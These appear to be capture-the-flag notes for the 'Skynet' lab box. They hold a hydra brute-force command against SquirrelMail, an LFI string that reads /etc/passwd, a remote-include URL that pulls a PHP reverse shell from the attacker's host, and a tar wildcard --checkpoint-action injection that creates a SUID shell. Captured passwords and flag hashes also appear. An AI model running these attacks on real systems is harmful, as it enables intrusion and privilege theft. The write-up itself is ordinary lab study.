# Skynet 

# Target IP : 10.10.234.100

# My IP : 10.17.6.109

# PORT 445 

2 shares Anonymous , Miles Dyson
> anonymous
attention.txt
log files
> miles Dyson : )s{A&2Z=F^n_E.B`

```bash
smbclient //10.10.234.100/milesdyson -U milesdyson 
```
/notes/important.txt
/45kra24zxs28v3yd


# PORT 80
/squirelmail
```bash
# correct
hydra -l milesdyson -P log1.txt 10.10.234.100 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." -V -t 30

# incorrect
hydra -l milesdyson -P ./log1.txt  10.10.234.100 http-form-post "/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." -V -t 30

milesdyson:cyborg007haloterminator
```

> inbox
```
1
samba password reset
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`

2
serenakogan@skynet
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111

balls have zero to me to me to me to me to me to me to me to me to

3
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to

```
/45kra24zxs28v3yd
contains 
/administator page

lfi/rfi at 
http://10.10.234.100/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

exploit using a php rev shell on local machine 
open server using python
http://10.10.234.100/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.17.6.109:8080/rev.php


# shell

use the same old password to get user shell
> miles
user.txt
7ce5c2109a40f958099283600a9ae807

backup.sh running in cron
which uses tar with *
```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

```

```bash
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=sh shell.sh"


#!/bin/bash
cp /bin/bash /tmp/rooter
chmod +s /tmp/rooter

```

> user root
root.txt
3f0372db24753accc7179a282cd6a949